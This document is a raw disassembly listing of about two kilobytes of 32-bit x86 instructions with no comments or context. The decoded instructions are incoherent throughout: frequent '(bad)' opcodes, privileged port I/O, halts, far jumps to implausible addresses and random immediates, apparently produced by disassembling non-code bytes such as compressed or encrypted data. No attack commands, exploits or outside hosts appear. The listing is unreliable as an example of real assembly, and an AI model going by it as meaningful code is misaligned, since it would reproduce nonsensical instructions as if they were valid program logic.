  41aaa8:	shl    DWORD PTR [edx-0x46],cl
  41aaab:	fs xor cl,bl
  41aaae:	(bad)
  41aab1:	adc    al,0xbe
  41aab3:	push   ecx
  41aab4:	mov    ecx,0xa4b14f9c
  41aab9:	mov    dl,0xe1
  41aabb:	mov    al,ds:0x94ddd5d0
  41aac0:	addr16 ret 
  41aac2:	js     0x41aa85
  41aac4:	mov    edx,0x141a305a
  41aac9:	and    BYTE PTR ds:0x5d2faf90,0xd8
  41aad0:	sub    BYTE PTR [ebx*4+0x3997bf2e],0xce
  41aad8:	mov    eax,ds:0xd90d2108
  41aadd:	loope  0x41aaf7
  41aadf:	or     eax,0x2fb79ee7
  41aae4:	mov    al,bh
  41aae6:	call   0x9ea321ae
  41aaeb:	scas   eax,DWORD PTR es:[edi]
  41aaec:	mov    gs,WORD PTR [edi+0x46]
  41aaef:	adc    DWORD PTR [esi-0x50],edi
  41aaf2:	fadd   DWORD PTR [ecx-0x323798db]
  41aaf8:	daa    
  41aaf9:	jge    0x41ab10
  41aafb:	aam    0xda
  41aafd:	mov    eax,ds:0xcca545c0
  41ab02:	adc    ebx,DWORD PTR [esi]
  41ab04:	mov    WORD PTR [edx],fs
  41ab06:	shl    BYTE PTR [esi],0x56
  41ab09:	xchg   ebx,eax
  41ab0a:	and    eax,0x6181b278
  41ab0f:	dec    esi
  41ab10:	push   ds
  41ab11:	fidivr DWORD PTR ds:0x5319f422
  41ab17:	adc    al,0x4c
  41ab19:	stos   DWORD PTR es:[edi],eax
  41ab1a:	ins    DWORD PTR es:[edi],dx
  41ab1b:	cwde   
  41ab1c:	inc    ecx
  41ab1d:	fucom  st(3)
  41ab1f:	sbb    al,0x93
  41ab21:	sbb    eax,0x6dd72ad0
  41ab26:	and    esi,DWORD PTR [esp+ebp*4-0x4c10712]
  41ab2d:	paddusb mm2,QWORD PTR [edi+0x63]
  41ab31:	mov    bh,0xb
  41ab33:	mov    esi,0x3ed479a3
  41ab38:	sbb    BYTE PTR ds:0x6cc53b6a,bh
  41ab3e:	ret    
  41ab3f:	addr16 push edi
  41ab41:	lea    ecx,[eax+0x14481fcb]
  41ab47:	sbb    cl,0x1e
  41ab4a:	inc    BYTE PTR [ebx+0x5c3f39d4]
  41ab50:	xor    edi,esp
  41ab52:	lods   eax,DWORD PTR ds:[esi]
  41ab53:	mul    cl
  41ab55:	mov    dh,dh
  41ab57:	stos   BYTE PTR es:[edi],al
  41ab58:	es scas al,BYTE PTR es:[edi]
  41ab5a:	(bad)  
  41ab5b:	call   0xf094:0x5bf99d2b
  41ab62:	mov    dl,0xd6
  41ab64:	ss pop esp
  41ab66:	jne    0x41abe7
  41ab68:	sbb    ebx,esp
  41ab6a:	lahf   
  41ab6b:	push   ds
  41ab6c:	retf   0x2876
  41ab6f:	mov    ch,0xa
  41ab71:	sbb    dl,bh
  41ab73:	or     DWORD PTR [esi-0x4d],eax
  41ab76:	loope  0x41abf3
  41ab78:	or     eax,ecx
  41ab7a:	retf   0x720f
  41ab7d:	add    ah,ch
  41ab7f:	scas   eax,DWORD PTR es:[edi]
  41ab80:	and    DWORD PTR [ebp+0x2b940fb2],0xffffffdc
  41ab87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab88:	dec    ebp
  41ab89:	fmul   DWORD PTR [edi+0x1e80ec4b]
  41ab8f:	pushf  
  41ab90:	sbb    ah,BYTE PTR [esi+0x36]
  41ab93:	mov    ah,cl
  41ab95:	jge    0x41ac00
  41ab97:	(bad)  
  41ab98:	lahf   
  41ab99:	in     al,dx
  41ab9a:	and    ecx,edi
  41ab9c:	and    DWORD PTR [esi+0x1d8845f7],0x26
  41aba3:	in     al,0x88
  41aba5:	outs   dx,BYTE PTR ds:[esi]
  41aba6:	or     eax,0xd4c98039
  41abab:	or     al,0x52
  41abad:	pop    es
  41abae:	sahf   
  41abaf:	push   es
  41abb0:	dec    edi
  41abb1:	sbb    BYTE PTR [ebx],ch
  41abb3:	in     eax,0x25
  41abb5:	neg    BYTE PTR [ecx-0x71e73f47]
  41abbb:	test   eax,0xc5805da2
  41abc0:	lods   eax,DWORD PTR ds:[esi]
  41abc1:	sbb    DWORD PTR [edi-0x6c079ea0],ebx
  41abc7:	push   esi
  41abc8:	dec    ebx
  41abc9:	or     eax,0xfcb49b17
  41abce:	scas   al,BYTE PTR es:[edi]
  41abcf:	das    
  41abd0:	jmp    0x41ab9c
  41abd2:	fcom   DWORD PTR [eax]
  41abd4:	mov    bh,0x57
  41abd6:	nop
  41abd7:	mov    dl,0x32
  41abd9:	ins    BYTE PTR es:[edi],dx
  41abda:	clc    
  41abdb:	std    
  41abdc:	inc    edi
  41abdd:	add    DWORD PTR [ecx-0x68ea90b2],ecx
  41abe3:	js     0x41abd7
  41abe5:	jmp    0x41ab74
  41abe7:	xor    dl,bh
  41abe9:	mov    edx,0x86e28b51
  41abee:	jo     0x41abef
  41abf0:	or     eax,0xd7558491
  41abf5:	inc    edi
  41abf6:	stos   BYTE PTR es:[edi],al
  41abf7:	add    al,0xdd
  41abf9:	aam    0xa5
  41abfb:	and    eax,DWORD PTR [eax-0x13]
  41abfe:	nop
  41abff:	push   ds
  41ac00:	test   eax,0x4a1e5818
  41ac05:	ret    0x1e3c
  41ac08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac09:	add    edi,edi
  41ac0b:	mov    ds:0x87c9e4d0,eax
  41ac10:	or     al,0x6e
  41ac12:	mov    edi,0x67b49b54
  41ac17:	ins    BYTE PTR es:[edi],dx
  41ac18:	pop    edx
  41ac19:	retf   
  41ac1a:	push   ss
  41ac1b:	scas   al,BYTE PTR es:[di]
  41ac1d:	iret   
  41ac1e:	pop    ebx
  41ac1f:	out    dx,al
  41ac20:	mov    edi,0xc20d006c
  41ac25:	pop    edx
  41ac26:	fsubr  QWORD PTR [edx-0x2f]
  41ac29:	outs   dx,BYTE PTR ds:[esi]
  41ac2a:	(bad)  
  41ac2b:	xlat   BYTE PTR ds:[ebx]
  41ac2c:	mov    edx,0xd6d6f04d
  41ac31:	xchg   ebx,eax
  41ac32:	rcr    DWORD PTR [ebx],cl
  41ac34:	(bad)  
  41ac35:	in     eax,0xb9
  41ac37:	jbe    0x41ac63
  41ac39:	xor    dh,cl
  41ac3b:	lock lds edx,FWORD PTR [edi-0xf44dd53]
  41ac42:	mov    ah,0xea
  41ac44:	stos   DWORD PTR es:[edi],eax
  41ac45:	test   BYTE PTR [eax+0x404634ad],bl
  41ac4b:	inc    esp
  41ac4c:	jl     0x41acb9
  41ac4e:	adc    ecx,DWORD PTR [edi+0x2c]
  41ac51:	(bad)  
  41ac52:	rcr    DWORD PTR [eax+0x3fecb76d],cl
  41ac58:	shr    BYTE PTR ds:0x6b25b1ca,cl
  41ac5e:	es pop ecx
  41ac60:	aad    0x79
  41ac62:	pop    esi
  41ac63:	repz push ebp
  41ac65:	inc    esi
  41ac66:	ret    0x9874
  41ac69:	fst    DWORD PTR [eax]
  41ac6b:	add    al,0x6
  41ac6d:	mov    edx,tr5
  41ac70:	jecxz  0x41ac7b
  41ac72:	push   esi
  41ac73:	lds    ebx,FWORD PTR [ebp+0x13]
  41ac76:	adc    eax,0x222a343f
  41ac7b:	daa    
  41ac7c:	mov    WORD PTR [edx],cs
  41ac7e:	sub    al,0xaa
  41ac80:	sbb    ecx,DWORD PTR [ebp*1-0x46708e94]
  41ac87:	(bad)  
  41ac88:	loope  0x41ac6e
  41ac8a:	xchg   ecx,eax
  41ac8b:	jl     0x41acb7
  41ac8d:	xor    ebp,DWORD PTR [esi]
  41ac8f:	or     eax,0x86abeeb
  41ac94:	adc    BYTE PTR [eax],al
	...
  41ad12:	add    BYTE PTR [eax],al
  41ad14:	push   ebx
  41ad15:	inc    edx
  41ad16:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  41ad1d:	pop    eax
  41ad1e:	cdq    
  41ad1f:	rcl    DWORD PTR [edi],0xb2
  41ad22:	fwait
  41ad23:	adc    ebx,eax
  41ad25:	dec    ebx
  41ad26:	add    DWORD PTR [eax],eax
  41ad28:	imul   eax,DWORD PTR [edi],0xae2a0000
  41ad2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad2f:	sbb    bl,bl
  41ad31:	sbb    bl,BYTE PTR [ebx-0x4f]
  41ad34:	or     al,0xc4
  41ad36:	mov    eax,ds:0xbcf9de1b
  41ad3b:	xchg   esp,eax
  41ad3c:	inc    eax
  41ad3d:	fadd   st,st(4)
  41ad3f:	pop    ebp
  41ad40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad41:	aam    0xc1
  41ad43:	shl    DWORD PTR [esi+0x7213eb12],1
  41ad49:	push   es
  41ad4a:	loop   0x41adca
  41ad4c:	sar    ebp,1
  41ad4e:	pop    ds
  41ad4f:	push   0x63
  41ad51:	xor    eax,DWORD PTR [eax+edi*4-0x4c]
  41ad55:	dec    ebp
  41ad56:	shl    BYTE PTR [ebp-0xbcff9c3],1
  41ad5c:	adc    eax,0x7b245363
  41ad61:	rcl    ch,1
  41ad63:	gs xchg ebp,eax
  41ad65:	adc    eax,0xf23ac3f
  41ad6a:	jge    0x41acf1
  41ad6c:	adc    dl,cl
  41ad6e:	fnstsw WORD PTR [edi+0x6e]
  41ad71:	add    BYTE PTR [eax+0x616c4f6a],bh
  41ad77:	sbb    al,0x93
  41ad79:	cmp    edi,DWORD PTR [eax+0x486c75b0]
  41ad7f:	hlt    
  41ad80:	in     al,0x1
  41ad82:	in     eax,0x1
  41ad84:	sub    al,0xe1
  41ad86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad87:	mul    BYTE PTR [edi+0x7c5cf771]
  41ad8d:	fst    QWORD PTR [ebp+0x15]
  41ad90:	inc    edx
  41ad91:	rcl    ecx,cl
  41ad93:	out    0xbe,eax
  41ad95:	mov    bl,0xf9
  41ad97:	or     BYTE PTR [esi+0x2a],0x59
  41ad9b:	mul    BYTE PTR [edx+0x5522fc9b]
  41ada1:	fild   DWORD PTR [edx]
  41ada3:	dec    edx
  41ada4:	data16 or BYTE PTR [esi+0x38],ah
  41ada8:	add    BYTE PTR [ebp-0x12fd4e8e],bh
  41adae:	or     ebx,DWORD PTR [ebx+0x415d93a]
  41adb4:	dec    ebp
  41adb5:	cmp    eax,0xf6486b5b
  41adba:	add    BYTE PTR [esi-0x2c],ah
  41adbd:	ds into 
  41adbf:	int    0x4d
  41adc1:	in     eax,0x98
  41adc3:	hlt    
  41adc4:	mov    ds:0x9cd3307,al
  41adc9:	push   es
  41adca:	sti    
  41adcb:	or     BYTE PTR [ebx+0x46fb4a6e],dh
  41add1:	and    DWORD PTR [edx+eax*8+0x28],esi
  41add5:	inc    ebx
  41add6:	cmp    al,0xa2
  41add8:	cmp    DWORD PTR [edi],0x81b42081
  41adde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41addf:	xchg   ebx,eax
  41ade0:	dec    ecx
  41ade1:	jae    0x41ad90
  41ade3:	wbinvd 
  41ade5:	hlt    
  41ade6:	inc    edx
  41ade7:	inc    eax
  41ade8:	icebp  
  41ade9:	add    DWORD PTR [esi-0x4c298cb5],0x7b
  41adf0:	add    BYTE PTR [ebx-0x2f9bd6bc],bl
  41adf6:	sbb    eax,edx
  41adf8:	inc    edx
  41adf9:	xor    al,0x2a
  41adfb:	test   al,0xb6
  41adfd:	mov    bh,0x9a
  41adff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae00:	mov    ebp,DWORD PTR [eax-0x69]
  41ae03:	mov    es,WORD PTR [edx+ebx*8-0x48396bb3]
  41ae0a:	scas   eax,DWORD PTR es:[edi]
  41ae0b:	inc    esp
  41ae0c:	call   0xd259:0x21464c49
  41ae13:	xor    esp,DWORD PTR [esi-0x5d6d1d09]
  41ae19:	mov    ah,0xad
  41ae1b:	je     0x41ae40
  41ae1d:	pushf  
  41ae1e:	sub    ch,0x6c
  41ae21:	fs mov bh,0xa5
  41ae24:	dec    ecx
  41ae25:	mov    esp,0x1909856
  41ae2a:	js     0x41ae39
  41ae2c:	sub    cl,dl
  41ae2e:	mov    bh,0x8b
  41ae30:	test   esi,0x9b2ccdbe
  41ae36:	in     eax,0xd9
  41ae38:	out    dx,al
  41ae39:	adc    al,0xff
  41ae3b:	imul   ecx,DWORD PTR [edi-0x27],0x70
  41ae3f:	iret   
  41ae40:	cwde   
  41ae41:	dec    ebx
  41ae42:	mov    ebp,0xeb0d304a
  41ae47:	pop    ds
  41ae48:	ret    
  41ae49:	xchg   edx,eax
  41ae4a:	xor    dl,bl
  41ae4c:	dec    esp
  41ae4d:	push   edi
  41ae4e:	mov    DWORD PTR [edx-0x38296f51],ebx
  41ae54:	mov    ds:0x1afec153,eax
  41ae59:	fldenv [eax+edi*2-0x71]
  41ae5d:	mov    cl,al
  41ae5f:	pop    ds
  41ae60:	push   ebx
  41ae61:	outs   dx,DWORD PTR ds:[esi]
  41ae62:	fcmovnu st,st(4)
  41ae64:	pop    ecx
  41ae65:	(bad)  
  41ae66:	xchg   ecx,eax
  41ae67:	sub    ch,bh
  41ae69:	int3   
  41ae6a:	loopne 0x41aded
  41ae6c:	dec    ecx
  41ae6d:	xchg   esp,eax
  41ae6e:	sub    ecx,DWORD PTR [esi+ecx*4]
  41ae71:	neg    BYTE PTR [ebx+0x44740f3]
  41ae77:	fld    st(3)
  41ae79:	mov    ds:0x59b54529,eax
  41ae7e:	ins    BYTE PTR es:[edi],dx
  41ae7f:	pop    ds
  41ae80:	mov    ah,0x70
  41ae82:	pop    ebp
  41ae83:	in     al,0x89
  41ae85:	add    eax,0x33efc58f
  41ae8a:	sbb    BYTE PTR [ecx+eiz*8+0x204815ad],bl
  41ae91:	mov    eax,ds:0x6b7f33be
  41ae96:	xor    DWORD PTR [eax-0x17b0ca6],0xffffff98
  41ae9d:	test   eax,0x4c47f141
  41aea2:	mov    ebx,DWORD PTR [ebp+0x72]
  41aea5:	cmp    BYTE PTR [edx],ch
  41aea7:	or     al,cl
  41aea9:	mov    ds:0x318cbc4a,al
  41aeae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeaf:	lods   eax,DWORD PTR ds:[esi]
  41aeb0:	jo     0x41ae50
  41aeb2:	mov    ebx,0x96ddb639
  41aeb7:	xor    DWORD PTR [edx],edx
  41aeb9:	push   edx
  41aeba:	jb     0x41ae3c
  41aebc:	adc    ch,BYTE PTR [ecx+edi*2+0x462772a5]
  41aec3:	clc    
  41aec4:	rcl    esi,cl
  41aec6:	lahf   
  41aec7:	rcl    DWORD PTR [ebp-0x26847ef],0x50
  41aece:	inc    eax
  41aecf:	xlat   BYTE PTR ds:[ebx]
  41aed0:	repnz rcr BYTE PTR [ebp+0x5c0272c3],0xe
  41aed8:	retf   0x1a2c
  41aedb:	mov    edi,0x2584a265
  41aee0:	aad    0x4
  41aee2:	push   edi
  41aee3:	sahf   
  41aee4:	repz and bl,BYTE PTR [ebx+edx*8-0x31088827]
  41aeec:	mov    eax,ds:0x46fe316f
  41aef1:	jecxz  0x41aed3
  41aef3:	mov    WORD PTR [eax+0x71dd58f],ss
  41aef9:	dec    edx
  41aefa:	cld    
  41aefb:	and    DWORD PTR [edx-0x7d],ebx
  41aefe:	scas   al,BYTE PTR es:[edi]
  41aeff:	rcr    DWORD PTR [ecx+0x63293be2],0x7a
  41af06:	dec    edi
  41af07:	jnp    0x41aede
  41af09:	mov    al,ds:0xca41ddc4
  41af0e:	je     0x41aee2
  41af10:	jp     0x41af8d
  41af12:	shl    ebp,0x45
  41af15:	sbb    DWORD PTR [edi-0x6b131f45],edx
  41af1b:	lods   eax,DWORD PTR ds:[esi]
  41af1c:	xlat   BYTE PTR ds:[ebx]
  41af1d:	std    
  41af1e:	call   0xa4925c4a
  41af23:	fs or  al,0xc3
  41af26:	sbb    eax,0xe1435ba
  41af2b:	ss (bad) 
  41af2d:	ds jo  0x41af33
  41af30:	aaa    
  41af31:	test   al,0x44
  41af33:	push   0xa009dea0
  41af38:	jns    0x41af16
  41af3a:	rol    DWORD PTR [ebx+edi*4-0x4a],0xdf
  41af3f:	hlt    
  41af40:	cmp    eax,0xce51951d
  41af45:	jo     0x41af99
  41af47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af48:	jno    0x41af10
  41af4a:	lods   al,BYTE PTR ds:[esi]
  41af4b:	xor    BYTE PTR [ecx-0x7b84df17],al
  41af51:	sbb    al,BYTE PTR [esi+0x1e]
  41af54:	mov    al,ds:0xb154395b
  41af59:	jmp    0x80b00793
  41af5e:	lods   eax,DWORD PTR ds:[esi]
  41af5f:	mov    dl,0xe8
  41af61:	jp     0x41afb0
  41af63:	mov    edx,0x9ab71d4d
  41af68:	(bad)  
  41af69:	jge    0x41af3a
  41af6b:	cmp    BYTE PTR [eax+0x68e55a41],0xd2
  41af72:	int    0xd
  41af74:	imul   eax,DWORD PTR [ebp-0x2df15f66],0xffffffa8
  41af7b:	cwde   
  41af7c:	mov    ebx,0x136a24ce
  41af81:	pop    edx
  41af82:	sbb    DWORD PTR [edx-0x39],esi
  41af85:	mov    al,0xd8
  41af87:	push   edx
  41af88:	sbb    esi,DWORD PTR [ecx-0x1c95fa3b]
  41af8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af8f:	inc    ebx
  41af90:	(bad)  ds:0xcbff400a
  41af96:	xchg   edx,eax
  41af97:	das    
  41af98:	shl    bl,1
  41af9a:	and    eax,0x5022f45d
  41af9f:	arpl   WORD PTR [edi-0x148c40f1],cx
  41afa5:	jmp    FWORD PTR [ecx+0x1022d7af]
  41afab:	test   al,0x4a
  41afad:	cmp    DWORD PTR [ecx],ecx
  41afaf:	mov    ds:0x5c619087,eax
  41afb4:	push   ebp
  41afb5:	xor    BYTE PTR [edi-0x6],bh
  41afb8:	adc    DWORD PTR [ebp+ecx*2+0x4d04db0c],esi
  41afbf:	pop    es
  41afc0:	mov    ecx,0xa8898cf
  41afc5:	js     0x41afae
  41afc7:	pop    ebp
  41afc8:	xchg   ecx,eax
  41afc9:	ret    
  41afca:	pop    esi
  41afcb:	xor    BYTE PTR [esi-0x7c6d1ad7],bl
  41afd1:	mov    esp,?
  41afd3:	aas    
  41afd4:	mov    al,0x38
  41afd6:	push   cs
  41afd7:	jmp    0x41b03e
  41afd9:	test   al,0x98
  41afdb:	sbb    edi,DWORD PTR [eax+0x1269cff6]
  41afe1:	mov    ch,0x8c
  41afe3:	lea    esi,[eax+esi*4-0x7d350918]
  41afea:	loop   0x41aff1
  41afec:	mov    cl,0x92
  41afee:	xchg   esi,eax
  41afef:	mov    ecx,0x75217c5f
  41aff4:	and    BYTE PTR [edx-0x4b1862b6],0x46
  41affb:	inc    edx
  41affc:	aad    0x83
  41affe:	xor    al,0x69
  41b000:	mov    eax,0xf56e0540
  41b005:	out    0x1e,eax
  41b007:	es retf 0x1eff
  41b00b:	and    eax,0x38319c2a
  41b010:	add    al,0x31
  41b012:	dec    ecx
  41b013:	shr    BYTE PTR [ebp-0x16496d4e],0xf9
  41b01a:	sub    esi,DWORD PTR [eax+0x2834726e]
  41b020:	je     0x41afa5
  41b022:	xor    DWORD PTR [eax],ebx
  41b024:	add    BYTE PTR [ebx],0x73
  41b027:	and    cl,BYTE PTR [edx]
  41b029:	sbb    eax,0x5c63b814
  41b02e:	sbb    ch,BYTE PTR [edx]
  41b030:	aad    0x38
  41b032:	sub    al,0x1e
  41b034:	xchg   ecx,eax
  41b035:	mov    ds,edx
  41b037:	pop    esi
  41b038:	add    ebp,DWORD PTR [ecx]
  41b03a:	imul   edi,DWORD PTR [ebp+0x77dd1018],0x2e
  41b041:	jmp    0xfb59:0xf836b727
  41b048:	inc    ecx
  41b049:	fbstp  TBYTE PTR [esi-0x9]
  41b04c:	sbb    eax,0x58ae820b
  41b051:	loopne 0x41b04d
  41b053:	imul   eax,DWORD PTR [edi+0x66a5dc8f],0x88caf0e0
  41b05d:	adc    al,0xf0
  41b05f:	jge    0x41b07a
  41b061:	or     eax,0x36c30486
  41b066:	test   edx,esp
  41b068:	inc    eax
  41b069:	add    BYTE PTR ds:0xc60c2cbb,bh
  41b06f:	dec    edx
  41b070:	pop    ebx
  41b071:	hlt    
  41b072:	mov    edi,0xc111185e
  41b077:	sub    DWORD PTR [edi+0x45],esp
  41b07a:	fcom   DWORD PTR [edi]
  41b07c:	lock push es
  41b07e:	out    dx,al
  41b07f:	mov    dl,0x32
  41b081:	out    0x47,eax
  41b083:	popa   
  41b084:	mov    BYTE PTR [ecx],ah
  41b086:	pop    es
  41b087:	out    0x4a,al
  41b089:	into   
  41b08a:	test   eax,0xb46aa76f
  41b08f:	(bad)  
  41b090:	inc    eax
  41b091:	shr    DWORD PTR cs:[ecx],1
  41b094:	pop    ds
  41b095:	outs   dx,DWORD PTR ds:[esi]
  41b096:	or     eax,DWORD PTR [ebp+0x7f893a0]
  41b09c:	fdiv   QWORD PTR [edi]
  41b09e:	inc    eax
  41b09f:	into   
  41b0a0:	arpl   bp,dx
  41b0a2:	clc    
  41b0a3:	or     al,bl
  41b0a5:	push   ebx
  41b0a6:	sub    BYTE PTR [edx],0x7d
  41b0a9:	cwde   
  41b0aa:	jns    0x41b0a0
  41b0ac:	jne    0x41b115
  41b0ae:	mov    al,0xb0
  41b0b0:	dec    edi
  41b0b1:	add    dh,al
  41b0b3:	sub    ecx,edx
  41b0b5:	and    eax,0x65ff175e
  41b0ba:	fiadd  WORD PTR [ebx+ebp*1]
  41b0bd:	mov    edi,0x8180b6d6
  41b0c2:	es stos DWORD PTR es:[edi],eax
  41b0c4:	sbb    DWORD PTR [edx+0x3a],0xffffffb4
  41b0c8:	cli    
  41b0c9:	ins    DWORD PTR es:[edi],dx
  41b0ca:	xor    bl,0x22
  41b0cd:	push   ecx
  41b0ce:	stos   BYTE PTR es:[edi],al
  41b0cf:	xlat   BYTE PTR ds:[ebx]
  41b0d0:	add    bl,dl
  41b0d2:	push   ecx
  41b0d3:	sbb    DWORD PTR [eax+0x15c0158b],0x37ea76af
  41b0dd:	adc    al,0x3c
  41b0df:	xchg   DWORD PTR [ecx+0x2c],esp
  41b0e2:	leave  
  41b0e3:	xchg   ecx,eax
  41b0e4:	aaa    
  41b0e5:	mov    al,0x51
  41b0e7:	sub    DWORD PTR [ecx+0x61],edi
  41b0ea:	stos   DWORD PTR es:[edi],eax
  41b0eb:	dec    ebx
  41b0ec:	cmp    eax,0x33ba91ab
  41b0f1:	test   eax,0x43bca525
  41b0f6:	sub    edi,ebp
  41b0f8:	hlt    
  41b0f9:	mov    esp,0xddb604d5
  41b0fe:	cmp    bh,BYTE PTR [esi+0x1288ebfe]
  41b104:	in     al,dx
  41b105:	mov    BYTE PTR [ebx+0x5f],dl
  41b108:	sti    
  41b109:	out    0xb2,al
  41b10b:	out    dx,eax
  41b10c:	shr    bl,cl
  41b10e:	sti    
  41b10f:	inc    ecx
  41b110:	and    al,0xfd
  41b112:	loop   0x41b165
  41b114:	in     eax,0xde
  41b116:	push   esp
  41b117:	in     al,dx
  41b118:	mov    esi,0x67eaf8f9
  41b11d:	push   edx
  41b11e:	pause  
  41b120:	mov    ch,0x62
  41b122:	add    al,0x50
  41b124:	mov    al,ds:0xaa2590bd
  41b129:	outs   dx,BYTE PTR ds:[esi]
  41b12a:	mov    edi,DWORD PTR [ecx]
  41b12c:	sub    al,0x58
  41b12e:	mov    esi,0xd18270b5
  41b133:	xchg   edx,eax
  41b134:	ficomp WORD PTR [ecx]
  41b136:	dec    esi
  41b137:	sbb    DWORD PTR [ecx-0x42],eax
  41b13a:	pop    ds
  41b13b:	and    ebx,esi
  41b13d:	cli    
  41b13e:	retf   
  41b13f:	fs mov edx,0x57d0828d
  41b145:	xlat   BYTE PTR ds:[ebx]
  41b146:	sahf   
  41b147:	cwde   
  41b148:	xor    al,0xed
  41b14a:	xor    BYTE PTR ss:[ebp+ebx*2-0x75892aa8],bh
  41b152:	lahf   
  41b153:	sub    dh,0x5b
  41b156:	in     al,dx
  41b157:	mov    eax,ds:0x1b416441
  41b15c:	jle    0x41b1c1
  41b15e:	mov    edx,0x32994f91
  41b163:	cmp    esi,DWORD PTR ds:0x33c9758a
  41b169:	jns    0x41b15c
  41b16b:	out    0xa5,eax
  41b16d:	in     al,dx
  41b16e:	retf   0xdbdb
  41b171:	adc    edx,ebp
  41b173:	imul   ecx
  41b175:	pop    esp
  41b176:	outs   dx,DWORD PTR ds:[esi]
  41b177:	mov    ecx,0x71a28464
  41b17c:	sahf   
  41b17d:	iret   
  41b17e:	out    0xe0,eax
  41b180:	push   0x87c77fd4
  41b185:	lods   eax,DWORD PTR ds:[esi]
  41b186:	xor    al,0xe6
  41b188:	js     0x41b162
  41b18a:	inc    ebp
  41b18b:	repnz sub ch,0x40
  41b18f:	kaddb  k3,k0,k2
  41b193:	(bad)  
  41b194:	(bad)  
  41b195:	imul   esi,DWORD PTR [ebp-0x41d178f5],0x2a
  41b19c:	inc    ebp
  41b19d:	mov    ds:0x5f81dbd,eax
  41b1a2:	or     bh,BYTE PTR [ecx]
  41b1a4:	add    ebp,0x4fb1d8e0
  41b1aa:	fild   DWORD PTR [esi+0x10]
  41b1ad:	ja     0x41b17e
  41b1af:	inc    eax
  41b1b0:	or     bl,BYTE PTR [ebx-0x1f]
  41b1b3:	in     eax,dx
  41b1b4:	ret    0xaa2e
  41b1b7:	es or  eax,0xa5473e36
  41b1bd:	es xchg esp,eax
  41b1bf:	mov    DWORD PTR [ebp-0x21943076],edx
  41b1c5:	pop    edi
  41b1c6:	int    0xfc
  41b1c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1c9:	adc    edx,DWORD PTR [ebp+edx*8-0x7c]
  41b1cd:	lds    eax,FWORD PTR [ebp+0x12]
  41b1d0:	xchg   DWORD PTR [ecx-0x59],edx
  41b1d3:	jle    0x41b221
  41b1d5:	jnp    0x41b15f
  41b1d7:	fld    DWORD PTR [esi-0x74]
  41b1da:	cmp    al,0x43
  41b1dc:	add    BYTE PTR [ecx-0x44a63796],bh
  41b1e2:	mov    esp,0xa8f92201
  41b1e7:	mov    dl,0x80
  41b1e9:	add    BYTE PTR [edi+0x17],dl
  41b1ec:	jle    0x41b16e
  41b1ee:	(bad)  
  41b1ef:	leave  
  41b1f0:	rcl    DWORD PTR [eax],cl
  41b1f2:	fld    st(1)
  41b1f4:	fidiv  WORD PTR [edi-0x4a]
  41b1f7:	sbb    eax,0x7ffd0339
  41b1fc:	enter  0x27bb,0x11
  41b200:	(bad)  
  41b201:	xchg   ecx,eax
  41b202:	or     DWORD PTR [ebx-0x19],esp
  41b205:	or     eax,DWORD PTR [ebx-0x7b]
  41b208:	cmp    BYTE PTR [esi-0x7ee06304],dh
  41b20e:	push   0x75
  41b210:	scas   al,BYTE PTR es:[edi]
  41b211:	mov    edx,0x1ee82c79
  41b216:	je     0x41b1c4
  41b218:	xor    eax,0x8d225e23
  41b21d:	jbe    0x41b224
  41b21f:	push   ds
  41b220:	ret    0x7c64
  41b223:	(bad)  
  41b224:	cmp    al,0x16
  41b226:	test   BYTE PTR [ebx+ebx*8],al
  41b229:	jb     0x41b246
  41b22b:	scas   eax,DWORD PTR es:[edi]
  41b22c:	inc    ecx
  41b22d:	retf   
  41b22e:	mov    ebx,0xe487da2
  41b233:	push   edx
  41b234:	xor    BYTE PTR ds:0xb9dff40c,al
  41b23a:	and    DWORD PTR [edx],esi
  41b23c:	cli    
  41b23d:	cmp    ch,BYTE PTR [esi]
  41b23f:	jmp    0x47097873
  41b244:	and    bl,BYTE PTR [ecx-0x6]
  41b247:	test   DWORD PTR [edi],ebx
  41b249:	sar    DWORD PTR [edi+0x63],0x64
  41b24d:	add    DWORD PTR [ecx+edx*4],esi
  41b250:	jae    0x41b2b9
  41b252:	mov    eax,ds:0xea57b544
  41b257:	mov    eax,0x5b82c49b
  41b25c:	adc    eax,0xd8823423
  41b261:	or     al,dh
  41b263:	sbb    al,dl
  41b265:	retf   
  41b266:	loope  0x41b213
  41b268:	cli    
  41b269:	popa   
  41b26a:	adc    eax,0x8aee9e6e
  41b26f:	pusha  
  41b270:	cld    
  41b271:	dec    ebp
  41b272:	push   ds
  41b273:	add    al,0xc8
  41b275:	sti    
  41b276:	cmp    esp,edi
  41b278:	pusha  
  41b279:	pop    ecx
  41b27a:	sti    
  41b27b:	dec    eax
  41b27c:	and    dl,ch
  41b27e:	adc    al,0x89
  41b280:	ror    DWORD PTR [edi],1
  41b282:	lods   eax,DWORD PTR ds:[esi]
  41b283:	into   
  41b284:	loopne 0x41b26b
  41b286:	mov    bh,0x58
  41b288:	push   0xffffff9c
  41b28a:	lea    ebp,[edi-0x48]
  41b28d:	jnp    0x41b2d6
  41b28f:	in     eax,0xc1
  41b291:	lock sub edx,ebx
  41b294:	out    0xbd,eax
  41b296:	stos   DWORD PTR es:[edi],eax
  41b297:	ret    0x5084
  41b29a:	or     ch,BYTE PTR [ebx+0x620fee88]
  41b2a0:	xchg   DWORD PTR [eax-0x11afca1b],ebx
  41b2a6:	fistp  QWORD PTR [ebp+0x45aa9797]
  41b2ac:	sub    BYTE PTR [esi-0xc46ff0a],bl
  41b2b2:	mov    dh,0xb9
  41b2b4:	xchg   BYTE PTR [ebx-0x64cd2050],dl
  41b2ba:	test   DWORD PTR [ecx],ebp
  41b2bc:	(bad)  
  41b2bd:	jne    0x41b338
  41b2bf:	mov    ecx,0x912e2ef2
  41b2c4:	adc    dl,BYTE PTR [edi+0x22924db]
  41b2ca:	sbb    DWORD PTR [ebx],ebp
  41b2cc:	cmp    bl,dl
  41b2ce:	aam    0xe0
  41b2d0:	in     al,dx
